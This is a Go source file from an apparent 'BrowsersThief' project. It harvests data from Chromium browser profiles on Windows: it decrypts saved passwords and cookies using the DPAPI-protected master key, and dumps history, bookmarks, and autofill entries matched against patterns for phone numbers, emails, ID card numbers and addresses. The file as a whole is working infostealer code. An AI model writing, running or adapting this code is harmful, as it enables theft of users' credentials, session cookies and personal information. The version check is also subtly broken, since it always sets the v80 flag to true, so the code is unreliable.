package browsers

import (
	"database/sql"
	"encoding/base64"
	"github.com/tidwall/gjson"
	"github.com/wywwzjj/BrowsersThief/utils"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type Chromium struct {
	userDataPath    string
	loginDataPath   string
	cookiesPath     string
	historyPath     string
	bookmarksPath   string
	webDataPath     string
	localStatePath  string
	lastVersionPath string
	masterKey       []byte
	isV80           bool
}

func newChromium(userDataPath string) *Chromium {
	chromium := &Chromium{
		userDataPath:    userDataPath,
		loginDataPath:   "\\Default\\Login Data",
		cookiesPath:     "\\Default\\Cookies",
		historyPath:     "\\Default\\History",
		bookmarksPath:   "\\Default\\Bookmarks",
		webDataPath:     "\\Default\\Web Data",
		localStatePath:  "\\Local State",
		lastVersionPath: "\\Last Version",
	}
	chromium.isChromiumV8()
	chromium.GetMasterKey()

	return chromium
}

func (chromium *Chromium) GetLoginData() {
	utils.PrintSeparator("GetLoginData")
	loginDataPath := chromium.userDataPath + chromium.loginDataPath
	tmpDbPath := os.Getenv("temp") + "\\history233"
	if !utils.CopyFile(loginDataPath, tmpDbPath) {
		return
	}
	defer os.Remove(tmpDbPath)

	db, err := sql.Open("sqlite3", tmpDbPath)
	if err != nil {
		log.Println(err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT action_url, username_value, password_value FROM logins`)
	if err != nil {
		log.Println(err)
	}
	for rows.Next() {
		var url, username string
		var encPass, plainPass []byte
		err = rows.Scan(&url, &username, &encPass)
		if chromium.isV80 {
			plainPass, err = utils.DecryptPassword(encPass, chromium.masterKey)
		} else {
			plainPass, err = utils.CryptUnprotectData(encPass)
		}
		if err != nil {
			log.Println(err)
			continue
		}
		if len(url) > 0 {
			log.Printf("[url] : %s\n\t\t\t\t\t[username] : %s\n\t\t\t\t\t[password] : %s", url, username, plainPass)
		}
	}
}

func (chromium *Chromium) GetCookies() {
	utils.PrintSeparator("GetCookies")
	cookiesDbPath := chromium.userDataPath + chromium.cookiesPath
	tmpDbPath := os.Getenv("temp") + "\\cookies233"
	if !utils.CopyFile(cookiesDbPath, tmpDbPath) {
		return
	}
	defer os.Remove(tmpDbPath)

	db, err := sql.Open("sqlite3", tmpDbPath)
	if err != nil {
		log.Println(err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT host_key, name, encrypted_value FROM cookies ORDER BY host_key`)
	if err != nil {
		log.Println(err)
	}
	for rows.Next() {
		var hostKey, name string
		var encryptedValue, decryptedValue []byte
		err = rows.Scan(&hostKey, &name, &encryptedValue)
		if err != nil {
			log.Println(err)
			continue
		}
		if chromium.isV80 {
			decryptedValue, err = utils.DecryptPassword(encryptedValue, chromium.masterKey)
		} else {
			decryptedValue, err = utils.CryptUnprotectData(encryptedValue)
		}
		if err != nil {
			log.Println(err)
		}
		log.Printf("[hostKey] : %s\t[cookies] : %s=%s\n", hostKey, name, string(decryptedValue))
	}
}

func (chromium *Chromium) GetHistory() {
	utils.PrintSeparator("GetHistory")
	historyDbPath := chromium.userDataPath + chromium.historyPath
	tmpDbPath := os.Getenv("temp") + "\\history233"
	if !utils.CopyFile(historyDbPath, tmpDbPath) {
		return
	}
	defer os.Remove(tmpDbPath)

	db, err := sql.Open("sqlite3", tmpDbPath)
	if err != nil {
		log.Println(err)
	}
	defer db.Close()

	rows, err := db.Query(`SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC`)
	if err != nil {
		log.Println(err)
	}
	for rows.Next() {
		var url, title, visitCount, lastVisitTime string
		err = rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		if err != nil {
			log.Println(err)
			continue
		}
		if lastVisitTime != "0" {
			// tme, _ := time.Parse("2006-01-02 15:04:05", lastVisitTime)
			// lastVisitTime = tme.String()

			i, _ := strconv.ParseInt(lastVisitTime, 10, 64)
			lastVisitTime = time.Unix(i, 0).String()
		}
		log.Printf("[url] : %s\n\t\t\t\t\t[title] : %s\n\t\t\t\t\t[visitCount] : %s\n\t\t\t\t\t[lastVisitTime] : %s\n", url, title, visitCount, lastVisitTime)
	}
}

func (chromium *Chromium) GetBookmarks() {
	utils.PrintSeparator("GetBookmarks")
	bookmarksPath := chromium.userDataPath + chromium.bookmarksPath
	// TODO pretty json
	content, err := ioutil.ReadFile(bookmarksPath)
	if err != nil {
		panic(err)
	}
	results := gjson.Get(string(content), "roots.bookmark_bar.children.#.url").Array()
	for _, result := range results {
		log.Printf("[url] : %s\n", result)
	}
}

func (chromium *Chromium) GetWebData() {
	utils.PrintSeparator("GetWebData")
	webDataDbPath := chromium.userDataPath + chromium.webDataPath
	tmpDbPath := os.Getenv("temp") + "\\webData233"
	if !utils.CopyFile(webDataDbPath, tmpDbPath) {
		return
	}
	defer os.Remove(tmpDbPath)

	db, err := sql.Open("sqlite3", tmpDbPath)
	if err != nil {
		log.Println(err)
	}
	defer db.Close()

	// TODO handle other table
	rows, err := db.Query(`SELECT distinct value_lower, count FROM autofill ORDER BY count DESC`)
	if err != nil {
		log.Println(err)
	}

	regMap := make(map[string]string)
	regMap["phone"] = `^(?:\+?86)?1(?:3\d{3}|5[^4\D]\d{2}|8\d{3}|7(?:[35678]\d{2}|4(?:0\d|1[0-2]|9\d))|9[189]\d{2}|66\d{2})\d{6}$`
	regMap["email"] = `^\w+@(\w+\.)+\w+`
	regMap["ip"] = `'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b`
	regMap["idCard"] = `^[1-9]\d{5}(18|19|20)\d{2}((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]`
	regMap["address"] = `.*?省|.*?行政区|.*?市`

	for rows.Next() {
		var value, count string
		err = rows.Scan(&value, &count)
		if err != nil {
			log.Println(err)
			continue
		}
		for k, reg := range regMap {
			if matched, err := regexp.MatchString(reg, value); matched && err == nil {
				log.Printf("[%s] : %s\t%s\n", k, value, count)
			}
		}
	}
}

func (chromium *Chromium) isChromiumV8() {
	versionFilePath := chromium.userDataPath + chromium.lastVersionPath
	if utils.PathExists(versionFilePath) {
		content, err := ioutil.ReadFile(versionFilePath)
		if err != nil {
			panic(err)
			return
		}
		spl := strings.Split(string(content), ".")
		if len(spl) == 0 {
			return
		}
		version, _ := strconv.ParseInt(spl[0], 10, 32)
		chromium.isV80 = version >= 80
	}
	chromium.isV80 = true
}

// GetMasterKey returns master key
func (chromium *Chromium) GetMasterKey() ([]byte, error) {
	keyFile := chromium.userDataPath + chromium.localStatePath
	res, _ := ioutil.ReadFile(keyFile)
	masterKey, err := base64.StdEncoding.DecodeString(gjson.Get(string(res), "os_crypt.encrypted_key").String())
	if err != nil {
		return nil, err
	}

	masterKey = masterKey[5:] // remove string: DPAPI
	masterKey, err = utils.CryptUnprotectData(masterKey)
	if err != nil {
		return nil, err
	}

	chromium.masterKey = masterKey

	return masterKey, nil
}
